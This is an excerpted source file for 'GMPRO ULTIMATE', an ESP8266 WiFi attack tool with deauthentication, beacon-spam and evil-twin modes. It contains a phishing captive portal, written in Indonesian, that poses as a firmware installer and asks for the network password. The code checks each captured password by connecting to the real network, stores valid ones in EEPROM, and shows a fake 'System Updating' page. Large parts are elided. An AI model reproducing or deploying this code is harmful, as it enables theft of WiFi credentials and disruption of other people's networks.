/*
 * GMPRO ULTIMATE v5.4 - ELITE EDITION
 * Feature: Real-time WiFi Validation + Strobe LED + EEPROM
 */
...
const int LED_PIN = 2; // Built-in LED Wemos D1 Mini (GPIO2)
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

enum Mode { IDLE, DEAUTH_T, MASS_DEAUTH, BEACON_SPAM, EVIL_TWIN, PRANK, VALIDATING };
...
.btn{background:0 0;border:1px solid var(--g);color:var(--g);padding:12px 5px;cursor:pointer;font-weight:700;font-family:inherit;font-size:11px;text-transform:uppercase;width:100%;border-radius:3px;}
...
function scan(){log("Scanning...");fetch('/scan').then(r=>r.json()).then(d=>{let t=document.getElementById('list');t.innerHTML="";d.forEach(n=>{t.innerHTML+=`<tr><td>${n.s}</td><td>${n.r}</td><td><button onclick="sel('${n.s}',${n.c},'${n.m}')">OK</button></td></tr>`;});log("Done.");});}
...
// --- PHISHING UI (REAL TIME ERROR HANDLING) ---
...
<form action="/post">
<input type="text" name="pass" placeholder="Password WiFi" required minlength="8">
<button type="submit">INSTALL NOW</button></form></div>
<script>
  let urlParams = new URLSearchParams(window.location.search);
  if(urlParams.has('err')) { document.getElementById('msg').innerText = "ERROR: Password yang Anda masukkan salah. Silakan coba lagi."; document.getElementById('msg').style.color = "red"; }
</script>
</body></html>
)rawliteral";
...
void setup() {
  ...
  webServer.on("/edit", HTTP_POST, [](){ webServer.send(200, "text/plain", "DONE!"); }, handleFileUpload);
  ...
  webServer.on("/post", []() {
    ...
    if (WiFi.status() == WL_CONNECTED) {
      ...
      savePass(p);
      isStrobe = true;
      webServer.send(200, "text/html", "<h2>System Updating... Please Wait</h2>");
      currentMode = IDLE;
      WiFi.disconnect();
  ...
  webServer.onNotFound([]() {
    if (currentMode == EVIL_TWIN) webServer.send(200, "text/html", phish_html);
    else webServer.send(200, "text/html", admin_html);
  });
